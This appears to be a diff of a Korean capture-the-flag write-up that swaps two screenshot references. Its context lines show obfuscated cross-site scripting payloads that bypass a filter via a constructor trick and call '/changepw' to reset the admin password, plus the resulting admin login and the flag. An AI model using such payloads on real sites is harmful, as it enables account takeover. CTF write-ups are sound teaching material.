@@ -30,7 +30,7 @@ Set[`co`+`nstructor`]`\x61lert\x281\x29```
 </script>
 ```
 
-![](images/8.png)
+![](images/9.png)
 
 정상적으로 작동함을 파악하였다.
 
@@ -44,6 +44,6 @@ Set[`co`+`nst`+`ructor`]`f\x65tch(\x27/changepw\x27).then(e=>e.text()).then(e=>{
 
 페이로드를 실행하고 나면 id:admin,pw:matherfather로 admin 계정에 로그인이 가능하다 로그인 후 flag 페이지를 열어보면 flag를 획득할 수 있다
 
-![](images/9.png)
+![](images/8.png)
 
 flag{cb3ba4a90250765ff635}
